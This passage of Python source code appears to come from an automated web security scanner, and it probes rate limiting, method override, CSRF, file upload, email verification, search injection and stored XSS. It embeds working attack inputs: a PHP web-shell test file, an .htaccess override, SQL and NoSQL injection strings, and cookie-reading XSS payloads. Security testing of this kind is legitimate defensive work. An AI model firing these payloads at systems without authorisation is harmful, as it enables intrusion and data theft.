                    "form_fields": (ep.get("fields", []) if isinstance(ep, dict)
                                    else []),
                    "params": {},
                })
                seen_urls.add(ep_url)

        return targets

    async def _test_rate_limit(self, client: httpx.AsyncClient,
                               target: dict) -> dict | None:
        url = self._resolve_url(target["url"])
        rapid_count = 20
        success_count = 0
        rate_limited = False
        statuses = []

        body = {}
        for f in target["form_fields"]:
            name = f if isinstance(f, str) else f.get("name", "")
            body[name] = "test_value"
        if not body:
            body = {"username": "test@test.com", "password": "WrongPass123!"}

        for i in range(rapid_count):
            try:
                resp = await client.request(
                    target.get("method", "POST"), url, json=body
                )
                statuses.append(resp.status_code)
                if resp.status_code == 429:
                    rate_limited = True
                    break
                if resp.status_code in (200, 201, 401, 403):
                    success_count += 1
            except Exception:
                pass

        if not rate_limited and success_count >= rapid_count * 0.8:
            # Test bypass with slight variations
            bypass_success = 0
            bypass_methods = [
                # Add whitespace to param
                {**body, list(body.keys())[0]: f" {list(body.values())[0]}"},
                # Case variation
                {**body, list(body.keys())[0]: list(body.values())[0].upper()
                 if isinstance(list(body.values())[0], str) else list(body.values())[0]},
            ]
            # X-Forwarded-For variation
            for i, variant in enumerate(bypass_methods):
                try:
                    extra_headers = {
                        "X-Forwarded-For": f"10.0.0.{i + 1}",
                        "X-Real-IP": f"10.0.0.{i + 1}",
                    }
                    resp = await client.request(
                        target.get("method", "POST"), url, json=variant,
                        headers=extra_headers,
                    )
                    if resp.status_code != 429:
                        bypass_success += 1
                except Exception:
                    pass

            return self._make_finding(
                title=f"Missing Rate Limit on {urlparse(url).path}",
                severity="medium",
                url=url,
                method=target.get("method", "POST"),
                parameter=None,
                description=(
                    f"Sent {rapid_count} rapid requests to {url} without "
                    f"being rate limited. All requests returned success "
                    f"statuses. Statuses: "
                    f"{dict((s, statuses.count(s)) for s in set(statuses))}."
                ),
                impact=(
                    "Without rate limiting, attackers can brute-force "
                    "credentials, enumerate users, exhaust OTP codes, or "
                    "abuse password reset functionality."
                ),
                remediation=(
                    "Implement rate limiting on all authentication and "
                    "sensitive endpoints. Use progressive delays, CAPTCHA "
                    "after N failures, and account lockout policies. "
                    "Rate limit by IP, user, and session."
                ),
                payload_used=f"{rapid_count}x rapid POST {url}",
                confidence=0.75,
                request_data={"rapid_count": rapid_count, "body": body},
                response_data={
                    "success_count": success_count,
                    "rate_limited": rate_limited,
                    "status_distribution": {
                        str(s): statuses.count(s) for s in set(statuses)
                    },
                },
            )
        return None

    # ─── 6. HTTP Method Override ─────────────────────────────────────

    async def _test_method_override(self) -> list[dict]:
        findings = []
        # Test on endpoints that respond to GET — try to override to PUT/DELETE
        get_endpoints = [
            self._normalize_endpoint(ep) for ep in self.endpoints
            if self._normalize_endpoint(ep)["method"] == "GET"
            and not self._is_destructive(
                self._normalize_endpoint(ep)["url"]
            )
        ]

        if not get_endpoints:
            logger.info("BusinessLogicTester: No GET endpoints for method "
                        "override testing")
            return findings

        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            for target in get_endpoints[:8]:
                try:
                    results = await self._test_override(client, target)
                    findings.extend(results)
                except Exception as e:
                    logger.warning(
                        f"Method override test failed for {target['url']}: {e}"
                    )
        return findings

    async def _test_override(self, client: httpx.AsyncClient,
                             target: dict) -> list[dict]:
        findings = []
        url = self._resolve_url(target["url"])

        # Get baseline
        async with self.semaphore:
            try:
                baseline = await client.get(url)
                baseline_status = baseline.status_code
                baseline_len = len(baseline.text)
            except Exception:
                return findings

        override_tests = [
            # X-HTTP-Method-Override header
            {
                "method": "POST",
                "headers": {"X-HTTP-Method-Override": "PUT"},
                "desc": "X-HTTP-Method-Override: PUT",
            },
            {
                "method": "POST",
                "headers": {"X-HTTP-Method-Override": "DELETE"},
                "desc": "X-HTTP-Method-Override: DELETE",
            },
            {
                "method": "POST",
                "headers": {"X-HTTP-Method-Override": "PATCH"},
                "desc": "X-HTTP-Method-Override: PATCH",
            },
            # X-Method-Override header
            {
                "method": "POST",
                "headers": {"X-Method-Override": "PUT"},
                "desc": "X-Method-Override: PUT",
            },
            # _method parameter
            {
                "method": "POST",
                "body": {"_method": "PUT"},
                "desc": "_method=PUT in body",
            },
            {
                "method": "POST",
                "body": {"_method": "DELETE"},
                "desc": "_method=DELETE in body",
            },
        ]

        for test in override_tests:
            async with self.semaphore:
                try:
                    kwargs = {}
                    if "headers" in test:
                        kwargs["headers"] = test["headers"]
                    if "body" in test:
                        kwargs["json"] = test["body"]

                    resp = await client.request(test["method"], url, **kwargs)

                    # A successful override looks like:
                    # - Different status from baseline (especially 200 on
                    #   something that should be GET-only)
                    # - Different response body
                    # - Not a 405 Method Not Allowed
                    if (
                        resp.status_code not in (405, 501) and
                        resp.status_code in (200, 201, 202, 204) and
                        (
                            resp.status_code != baseline_status or
                            abs(len(resp.text) - baseline_len) > 100
                        )
                    ):
                        findings.append(self._make_finding(
                            title=f"HTTP Method Override Accepted: "
                                  f"{test['desc']}",
                            severity="medium",
                            url=url,
                            method=test["method"],
                            parameter="_method" if "body" in test else None,
                            description=(
                                f"The server accepted an HTTP method "
                                f"override via {test['desc']} on {url}. "
                                f"Baseline GET returned {baseline_status}, "
                                f"override returned {resp.status_code}. "
                                f"This can bypass method-based access "
                                f"controls."
                            ),
                            impact=(
                                "Attackers can bypass WAF rules or access "
                                "controls that filter by HTTP method. A "
                                "GET-only endpoint could be tricked into "
                                "accepting PUT/DELETE operations, enabling "
                                "unauthorized data modification or deletion."
                            ),
                            remediation=(
                                "Disable HTTP method override headers "
                                "(X-HTTP-Method-Override, X-Method-Override) "
                                "and _method parameter in production. If "
                                "needed for legacy support, restrict to "
                                "authenticated admin contexts only."
                            ),
                            payload_used=test["desc"],
                            confidence=0.6,
                            request_data={
                                "method": test["method"],
                                "headers": test.get("headers"),
                                "body": test.get("body"),
                            },
                            response_data={
                                "status": resp.status_code,
                                "baseline_status": baseline_status,
                                "len_diff": abs(
                                    len(resp.text) - baseline_len
                                ),
                                "snippet": resp.text[:300],
                            },
                        ))
                        break  # One finding per endpoint
                except httpx.TimeoutException:
                    pass
                except Exception as e:
                    logger.debug(f"Method override error: {e}")

        return findings

    # ─── 7. CSRF Protection Bypass ──────────────────────────────────

    async def _test_csrf_bypass(self) -> list[dict]:
        """Test CSRF protection on state-changing forms."""
        findings = []
        crawl_data = self.context.get("stateful_crawl", {})
        forms = crawl_data.get("forms", [])
        if not isinstance(forms, list):
            forms = list(forms.values()) if isinstance(forms, dict) else []

        state_changing = [
            self._normalize_endpoint(ep) for ep in self.endpoints
            if self._normalize_endpoint(ep)["method"] in ("POST", "PUT", "PATCH", "DELETE")
        ]

        targets = []
        for f in forms[:15]:
            url = f.get("action", f.get("url", ""))
            if url:
                targets.append({
                    "url": url, "method": f.get("method", "POST"),
                    "csrf_field": f.get("csrf_field"),
                    "csrf_token": f.get("csrf_token"),
                    "fields": f.get("fields", f.get("inputs", [])),
                    "source": "form",
                })
        for ep in state_changing[:10]:
            targets.append({**ep, "source": "endpoint"})

        if not targets:
            return findings

        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            for target in targets:
                try:
                    result = await self._test_csrf_on_endpoint(client, target)
                    if result:
                        findings.append(result)
                except Exception as e:
                    logger.debug(f"CSRF test error on {target.get('url')}: {e}")
        return findings

    async def _test_csrf_on_endpoint(self, client, target) -> dict | None:
        url = self._resolve_url(target["url"])
        method = target.get("method", "POST").upper()

        body = {}
        for field in target.get("fields", [])[:20]:
            name = field.get("name", field) if isinstance(field, dict) else str(field)
            if isinstance(field, dict):
                body[name] = field.get("value", "test")
            else:
                body[name] = "test"

        # Test 1: Submit WITHOUT CSRF token
        csrf_names = ("csrf", "csrf_token", "_token", "csrfmiddlewaretoken",
                      "authenticity_token", "__RequestVerificationToken", "_csrf")
        no_csrf_body = {k: v for k, v in body.items() if k not in csrf_names}
        async with self.semaphore:
            try:
                resp_no_token = await client.request(method, url, data=no_csrf_body)
            except Exception:
                return None

        if resp_no_token.status_code in range(200, 303):
            text = resp_no_token.text.lower()
            if not any(err in text for err in ("csrf", "forbidden", "invalid token", "419", "422")):
                return self._make_finding(
                    title=f"Missing CSRF Protection on {method} {urlparse(url).path}",
                    severity="medium",
                    url=url,
                    method=method,
                    parameter=None,
                    description=(
                        f"State-changing endpoint {method} {url} accepts requests "
                        f"without a CSRF token. Status: {resp_no_token.status_code}."
                    ),
                    impact=(
                        "Attacker can forge requests on behalf of authenticated users — "
                        "posting ads, editing profiles, deleting content, changing passwords."
                    ),
                    remediation=(
                        "Implement CSRF tokens for all state-changing operations. "
                        "Use SameSite=Strict cookies and verify Origin/Referer headers."
                    ),
                    payload_used=f"{method} {url} without CSRF token",
                    confidence=0.7,
                    request_data={"body": no_csrf_body},
                    response_data={"status": resp_no_token.status_code, "snippet": resp_no_token.text[:300]},
                )

        # Test 2: Submit with WRONG CSRF token
        if target.get("csrf_field"):
            tampered_body = dict(body)
            tampered_body[target["csrf_field"]] = "INVALID_TOKEN_12345"
            async with self.semaphore:
                try:
                    resp_bad = await client.request(method, url, data=tampered_body)
                except Exception:
                    return None

            if resp_bad.status_code in range(200, 303):
                text = resp_bad.text.lower()
                if not any(err in text for err in ("csrf", "forbidden", "invalid token")):
                    return self._make_finding(
                        title=f"CSRF Token Not Validated on {method} {urlparse(url).path}",
                        severity="high",
                        url=url,
                        method=method,
                        parameter=target["csrf_field"],
                        description=f"Endpoint accepts invalid CSRF token ('{target['csrf_field']}' = 'INVALID_TOKEN_12345').",
                        impact="CSRF token present but not validated. Attacker can use any value to forge cross-origin requests.",
                        remediation="Validate CSRF tokens server-side on every state-changing request.",
                        payload_used=f"{target['csrf_field']}=INVALID_TOKEN_12345",
                        confidence=0.85,
                        request_data={"body": tampered_body},
                        response_data={"status": resp_bad.status_code, "snippet": resp_bad.text[:300]},
                    )
        return None

    # ─── 8. File Upload Testing ─────────────────────────────────────

    async def _test_file_upload(self) -> list[dict]:
        """Test file upload endpoints for unrestricted upload vulnerabilities."""
        findings = []
        crawl_data = self.context.get("stateful_crawl", {})
        forms = crawl_data.get("forms", [])
        if not isinstance(forms, list):
            forms = list(forms.values()) if isinstance(forms, dict) else []

        upload_forms = [f for f in forms if f.get("is_upload")]

        upload_endpoints = []
        for ep in self.endpoints:
            norm = self._normalize_endpoint(ep)
            url_lower = norm["url"].lower()
            if any(kw in url_lower for kw in UPLOAD_KEYWORDS):
                upload_endpoints.append(norm)

        if not upload_forms and not upload_endpoints:
            return findings

        test_files = [
            ("shell.php", b"<?php echo 'PHANTOM_TEST'; ?>", "application/x-php"),
            ("shell.php.jpg", b"<?php echo 'PHANTOM_TEST'; ?>", "image/jpeg"),
            ("test.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/svg+xml"),
            ("test.html", b"<script>alert('XSS')</script>", "text/html"),
            (".htaccess", b"AddType application/x-httpd-php .jpg", "text/plain"),
        ]

        async with make_client(extra_headers=self.headers, timeout=20.0) as client:
            for form in upload_forms[:5]:
                url = self._resolve_url(form.get("action", form.get("url", "")))
                if not url:
                    continue
                file_field = "file"
                for field in form.get("fields", form.get("inputs", [])):
                    if isinstance(field, dict) and field.get("type") == "file":
                        file_field = field.get("name", "file")
                        break

                for filename, content, ctype in test_files:
                    async with self.semaphore:
                        try:
                            resp = await client.post(url, files={file_field: (filename, content, ctype)})
                            if resp.status_code in range(200, 303):
                                text = resp.text.lower()
                                if not any(msg in text for msg in ("not allowed", "invalid file", "unsupported", "file type", "extension")):
                                    sev = "critical" if filename.endswith((".php", ".phtml")) else "high"
                                    findings.append(self._make_finding(
                                        title=f"Unrestricted File Upload: {filename} accepted",
                                        severity=sev, url=url, method="POST", parameter=file_field,
                                        description=f"Upload accepted dangerous file '{filename}' ({ctype}). Status: {resp.status_code}.",
                                        impact="RCE via web shell, XSS via SVG/HTML, or server config override via .htaccess.",
                                        remediation="Validate file extensions (allowlist), check magic bytes, store outside webroot, use random filenames.",
                                        payload_used=f"Upload {filename} as {ctype}",
                                        confidence=0.75,
                                        request_data={"filename": filename, "content_type": ctype, "field": file_field},
                                        response_data={"status": resp.status_code, "snippet": resp.text[:300]},
                                    ))
                                    break
                        except Exception:
                            continue

            for ep in upload_endpoints[:5]:
                url = self._resolve_url(ep["url"])
                for field_name in ("file", "image", "upload", "attachment"):
                    for filename, content, ctype in test_files[:2]:
                        async with self.semaphore:
                            try:
                                resp = await client.post(url, files={field_name: (filename, content, ctype)})
                                if resp.status_code in range(200, 303):
                                    text = resp.text.lower()
                                    if not any(msg in text for msg in ("not allowed", "invalid", "unsupported")):
                                        findings.append(self._make_finding(
                                            title=f"File Upload Accepted: {filename} on {urlparse(url).path}",
                                            severity="high", url=url, method="POST", parameter=field_name,
                                            description=f"Accepted {filename} upload via field '{field_name}'.",
                                            impact="Potential RCE via web shell or XSS via SVG/HTML upload.",
                                            remediation="Implement file extension allowlist and magic byte validation.",
                                            payload_used=f"Upload {filename} via field={field_name}",
                                            confidence=0.65,
                                            request_data={"filename": filename, "field": field_name},
                                            response_data={"status": resp.status_code, "snippet": resp.text[:300]},
                                        ))
                                        return findings
                            except Exception:
                                continue
        return findings

    # ─── 9. Email Verification Bypass ───────────────────────────────

    async def _test_email_verification_bypass(self) -> list[dict]:
        """Test if email verification can be bypassed."""
        findings = []
        verify_endpoints = []
        for ep in self.endpoints:
            norm = self._normalize_endpoint(ep)
            url_lower = norm["url"].lower()
            if any(kw in url_lower for kw in VERIFY_KEYWORDS):
                verify_endpoints.append(norm)

        if not verify_endpoints:
            return findings

        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            for ep in verify_endpoints[:5]:
                url = self._resolve_url(ep["url"])
                # Test predictable tokens
                for token in ("1", "0", "true", "test", "admin", "00000000"):
                    async with self.semaphore:
                        try:
                            test_url = f"{url}?token={token}" if "?" not in url else url
                            resp = await client.get(test_url)
                            if resp.status_code == 200:
                                text = resp.text.lower()
                                if any(w in text for w in ("verified", "confirmed", "activated", "success")):
                                    findings.append(self._make_finding(
                                        title="Email Verification Bypass via Predictable Token",
                                        severity="high", url=url, method="GET", parameter="token",
                                        description=f"Verification endpoint accepted predictable token '{token}'.",
                                        impact="Attacker can verify arbitrary emails, bypass confirmation, create accounts with unowned emails.",
                                        remediation="Use cryptographically random, time-limited verification tokens. Rate limit attempts.",
                                        payload_used=f"token={token}",
                                        confidence=0.7,
                                        request_data={"url": test_url},
                                        response_data={"status": resp.status_code, "snippet": resp.text[:300]},
                                    ))
                                    break
                        except Exception:
                            continue

                # Test POST with manipulated params
                for payload in [{"email": "test@test.com", "verified": True}, {"confirmed": True}]:
                    async with self.semaphore:
                        try:
                            resp = await client.post(url, json=payload)
                            if resp.status_code in range(200, 303):
                                text = resp.text.lower()
                                if any(w in text for w in ("verified", "confirmed", "success")):
                                    findings.append(self._make_finding(
                                        title="Email Verification Bypass via Parameter Injection",
                                        severity="high", url=url, method="POST", parameter="verified/confirmed",
                                        description="Verification endpoint accepted direct status manipulation.",
                                        impact="Bypass email verification by sending crafted parameters.",
                                        remediation="Never trust client-side verification status. Use server-side token validation only.",
                                        payload_used=json.dumps(payload),
                                        confidence=0.65,
                                        request_data={"body": payload},
                                        response_data={"status": resp.status_code, "snippet": resp.text[:300]},
                                    ))
                                    break
                        except Exception:
                            continue
        return findings

    # ─── 10. Search/Filter Injection ────────────────────────────────

    async def _test_search_injection(self) -> list[dict]:
        """Test search, filter, and sort parameters for injection."""
        findings = []
        search_endpoints = []
        for ep in self.endpoints:
            norm = self._normalize_endpoint(ep)
            url_lower = norm["url"].lower()
            if any(kw in url_lower for kw in SEARCH_KEYWORDS):
                search_endpoints.append(norm)
            elif any(k.lower() in ("q", "query", "search", "keyword", "filter",
                                    "sort", "order", "order_by", "sort_by", "s", "term")
                     for k in norm.get("params", {})):
                if norm not in search_endpoints:
                    search_endpoints.append(norm)

        if not search_endpoints:
            # Fallback: try common search paths
            for path in ["/search", "/api/search", "/api/ads", "/ads",
                         "/api/users", "/api/products", "/api/items"]:
                search_endpoints.append({"url": path, "method": "GET", "form_fields": [], "params": {}})

        async with make_client(extra_headers=self.headers, timeout=15.0) as client:
            for target in search_endpoints[:10]:
                try:
                    result = await self._test_search_endpoint(client, target)
                    findings.extend(result)
                except Exception as e:
                    logger.debug(f"Search injection test error on {target.get('url')}: {e}")
        return findings

    async def _test_search_endpoint(self, client, endpoint) -> list[dict]:
        findings = []
        url = self._resolve_url(endpoint["url"])

        test_params = ["q", "query", "search", "keyword", "filter", "sort", "order_by", "sort_by", "s"]
        for k in endpoint.get("params", {}):
            if k.lower() not in test_params:
                test_params.append(k)

        sqli_payloads = [
            ("' OR '1'='1", "sqli"),
            ("1' ORDER BY 1--", "sqli"),
            ("1 UNION SELECT null--", "sqli"),
            ("' AND SLEEP(3)--", "sqli_time"),
        ]
        nosqli_payloads = [
            ('{"$gt":""}', "nosqli"),
            ('{"$regex":".*"}', "nosqli"),
        ]
        all_payloads = sqli_payloads + nosqli_payloads

        # Get baseline
        async with self.semaphore:
            try:
                baseline = await client.get(url, params={"q": "test12345xyz"})
                baseline_len = len(baseline.text)
                baseline_status = baseline.status_code
            except Exception:
                return findings

        sql_errors = [
            "sql syntax", "mysql", "postgresql", "sqlite",
            "ora-", "microsoft sql", "syntax error",
            "unclosed quotation", "unterminated string",
            "sqlexception", "jdbc", "hibernate",
            "django.db", "activerecord", "sequelize",
            "knex", "prisma", "typeorm",
        ]

        for param in test_params[:5]:
            for payload, attack_type in all_payloads:
                async with self.semaphore:
                    try:
                        resp = await client.get(url, params={param: payload})
                        text = resp.text.lower()
                        error_found = any(err in text for err in sql_errors)
                        size_diff = abs(len(resp.text) - baseline_len)
                        data_leak = size_diff > 500 and resp.status_code == 200 and baseline_status == 200

                        if error_found or data_leak:
                            severity = "critical" if error_found else "high"
                            type_names = {"sqli": "SQL Injection", "sqli_time": "SQL Injection",
                                          "nosqli": "NoSQL Injection"}
                            findings.append(self._make_finding(
                                title=f"{type_names.get(attack_type, 'Injection')} in search param '{param}'",
                                severity=severity, url=url, method="GET", parameter=param,
                                description=(
                                    f"Search param '{param}' vulnerable to {attack_type}. "
                                    f"{'SQL error in response. ' if error_found else ''}"
                                    f"{'Significant response size difference. ' if data_leak else ''}"
                                ),
                                impact="Extract database contents, bypass auth, or modify/delete data via injection.",
                                remediation="Use parameterized queries. Sanitize search/filter/sort inputs. Use ORM query builders.",
                                payload_used=f"{param}={payload}",
                                confidence=0.8 if error_found else 0.6,
                                request_data={"param": param, "payload": payload, "type": attack_type},
                                response_data={"status": resp.status_code, "error_detected": error_found,
                                               "size_diff": size_diff, "snippet": resp.text[:500]},
                            ))
                            break
                    except Exception:
                        continue
        return findings

    # ─── 11. Stored XSS in Profiles / Orders ─────────────────────────

    PROFILE_PATHS = [
        "/api/v1/users/me", "/api/v1/profile", "/api/v1/account",
        "/api/users/me", "/api/profile", "/api/account",
        "/api/v1/user/profile", "/api/v1/me",
    ]
    ORDER_PATHS = [
        "/api/v1/orders", "/api/v1/order", "/api/orders",
        "/api/v1/tasks", "/api/v1/posts", "/api/v1/comments",
        "/api/v1/messages", "/api/v1/tickets",
    ]
    XSS_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(document.cookie)>',
        '"><svg/onload=alert(1)>',
        "'-alert(1)-'",
        '<details open ontoggle=alert(1)>',
    ]
    # Fields commonly vulnerable to stored XSS
    PROFILE_FIELDS = ["fullName", "full_name", "name", "displayName", "display_name",
                      "bio", "about", "description", "website", "company", "location",
                      "firstName", "first_name", "lastName", "last_name", "nickname"]
    ORDER_FIELDS = ["description", "title", "name", "comment", "note", "notes",
                    "message", "text", "body", "content", "details", "subject"]

    async def _test_stored_xss(self) -> list[dict]:
        """Test for stored XSS by injecting payloads into profile and order fields."""
        if not self.auth_cookie and "Authorization" not in self.headers:
            logger.info("Stored XSS: skipped (no auth token)")
            return []

        findings = []
        async with make_client(extra_headers=self.headers) as client:
            # Test profile endpoints
            for path in self.PROFILE_PATHS:
                url = self._resolve_url(path)
                findings.extend(await self._test_stored_xss_endpoint(
                    client, url, self.PROFILE_FIELDS, "profile", "PUT"))
                # Also try PATCH
                findings.extend(await self._test_stored_xss_endpoint(
                    client, url, self.PROFILE_FIELDS, "profile", "PATCH"))

            # Test order/content creation endpoints
            for path in self.ORDER_PATHS:
                url = self._resolve_url(path)
                findings.extend(await self._test_stored_xss_endpoint(
                    client, url, self.ORDER_FIELDS, "order/content", "POST"))

            # Also test endpoints from context that look like user-editable resources
            for ep in self.endpoints:
                ep_norm = self._normalize_endpoint(ep)
                ep_url = ep_norm["url"].lower()
                if any(kw in ep_url for kw in ("profile", "user", "account", "order",
                                                 "post", "comment", "message", "ticket")):
                    if ep_norm["method"] in ("PUT", "PATCH", "POST"):
                        full_url = self._resolve_url(ep_norm["url"])
                        fields = self.PROFILE_FIELDS if "user" in ep_url or "profile" in ep_url else self.ORDER_FIELDS
                        findings.extend(await self._test_stored_xss_endpoint(
                            client, full_url, fields, "dynamic", ep_norm["method"]))

        return findings

    async def _test_stored_xss_endpoint(self, client: httpx.AsyncClient,
                                         url: str, fields: list[str],
                                         context_type: str, method: str) -> list[dict]:
        """Test a single endpoint for stored XSS across multiple fields."""
        findings = []

        for payload in self.XSS_PAYLOADS[:3]:  # Test top 3 payloads
            for field in fields[:8]:  # Top 8 fields
                try:
                    body = {field: payload}
                    async with self.semaphore:
                        if method == "PUT":
                            resp = await client.put(url, json=body)
                        elif method == "PATCH":
                            resp = await client.patch(url, json=body)
                        else:
                            resp = await client.post(url, json=body)

                    if resp.status_code in (200, 201):
                        resp_text = resp.text
                        # Check if XSS payload is reflected back unescaped
                        if payload in resp_text:
                            findings.append(self._make_finding(
                                title=f"Stored XSS in {context_type} field '{field}'",
                                severity="high",
                                url=url,
                                method=method,
                                parameter=field,
                                description=(
                                    f"XSS payload stored and reflected unescaped in {context_type} "
                                    f"field '{field}'. The server accepted and returned the payload "
                                    f"without sanitization or encoding."
                                ),
                                impact=(
                                    "Attacker can inject JavaScript that executes in other users' "
                                    "browsers, stealing session tokens, credentials, or performing "
                                    "actions on behalf of victims."
                                ),
                                remediation=(
                                    "Sanitize all user input on the server side. Use output encoding "
                                    "(HTML entity encoding) when rendering user-supplied content. "
                                    "Implement Content-Security-Policy headers."
                                ),
                                payload_used=f'{field}={payload}',
                                confidence=0.95,
                                request_data={"field": field, "payload": payload, "method": method},
                                response_data={"status": resp.status_code,
                                               "reflected": True,
                                               "snippet": resp_text[:500]},
                            ))
                            # One finding per field is enough
                            break
                    elif resp.status_code == 404:
                        # Endpoint doesn't exist, skip all fields
                        return findings

                except Exception:
                    continue
        return findings
